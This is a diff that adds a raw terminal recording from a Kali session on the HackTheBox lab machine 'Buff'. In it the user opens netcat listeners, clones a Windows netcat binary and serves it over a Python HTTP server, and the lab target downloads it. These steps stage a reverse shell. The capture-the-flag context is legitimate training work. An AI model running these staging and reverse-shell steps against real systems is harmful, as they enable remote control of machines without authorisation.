@@ -1,0 +1,55 @@
+Script started on 2020-09-11 07:44:58-05:00 [TERM="screen" TTY="/dev/pts/4" COLUMNS="87" LINES="24"]
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff[00m$ nc -lvnp 4444
+listening on [any] 4444 ...
+^C
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff[00m$ ls
+[0m[01;34mfiles[0m  [01;34mnmap[0m  [01;34mreqs[0m  reverse.log  root.txt  [01;34mscripts[0m
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff[00m$ rm =[K[K[K[Kcd scripts/
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ ls
+[0m[01;34mBUFF_ENV[0m  gym.py  nc.exe  [01;34mnetcat[0m
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ rm -r netcat/
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ rm nc.exe 
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ git clone https://github.com/int0x33/nc.exe.git
+Cloning into 'nc.exe'...
+remote: Enumerating objects: 13, done.[K
+Unpacking objects:   7% (1/13)Unpacking objects:  15% (2/13)Unpacking objects:  23% (3/13)Unpacking objects:  30% (4/13)Unpacking objects:  38% (5/13)Unpacking objects:  46% (6/13)Unpacking objects:  53% (7/13)Unpacking objects:  61% (8/13), 40.24 KiB | 79.00 KiB/sUnpacking objects:  69% (9/13), 40.24 KiB | 79.00 KiB/sUnpacking objects:  76% (10/13), 40.24 KiB | 79.00 KiB/sUnpacking objects:  84% (11/13), 40.24 KiB | 79.00 KiB/sUnpacking objects:  84% (11/13), 92.00 KiB | 88.00 KiB/sremote: Total 13 (delta 0), reused 0 (delta 0), pack-reused 13[K
+Unpacking objects:  92% (12/13), 92.00 KiB | 88.00 KiB/sUnpacking objects: 100% (13/13), 92.00 KiB | 88.00 KiB/sUnpacking objects: 100% (13/13), 114.05 KiB | 92.00 KiB/s, done.
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ ls
+[0m[01;34mBUFF_ENV[0m  gym.py  [01;34mnc.exe[0m
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ cd nc.exe/
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts/nc.exe[00m$ ls
+doexec.c   getopt.c  hobbit.txt   Makefile  nc.exe    readme.txt
+generic.h  getopt.h  license.txt  nc64.exe  netcat.c
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts/nc.exe[00m$ cd [K[K[Kcd ..
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ mv nc.exe/ netcat
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ mv ne[K[K[K[K[Kmv nc\\\[K[K[K[Ketcat/nc [K[K[K[K[K[K[K[K[K[K[K[K[Kcp netcat/nc.exe .
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ ls
+[0m[01;34mBUFF_ENV[0m  gym.py  nc.exe  [01;34mnetcat[0m
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [11/Sep/2020 07:48:07] "GET /nc.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ nc -lb[Kvnp 5[K4444
+listening on [any] 4444 ...
+^C
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ ls
+[0m[01;34mBUFF_ENV[0m  gym.py  nc.exe  [01;34mnetcat[0m
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ m[Krm nc.exe 
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ d[Kcd netcat/
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts/netcat[00m$ ls
+doexec.c  generic.h  getopt.c  getopt.h  hobbit.txt  license.txt  Makefile  nc64.exe  nc.exe  netcat.c  readme.txt
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts/netcat[00m$ c d[K[K[Kcd ..
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ mv netcat/ [K[K nc.exe
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [11/Sep/2020 07:49:28] "GET /nc.exe HTTP/1.1" 301 -
+^C
+Keyboard interrupt received, exiting.
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ nc -lvnp 4445
+listening on [any] 4445 ...
+^C
+[1;34mkali@kali[00m:[1;32m~/Documents/MACHINES_HTB/Buff/scripts[00m$ exit
+exit
+
+Script done on 2020-09-11 07:56:21-05:00 [COMMAND_EXIT_CODE="1"]
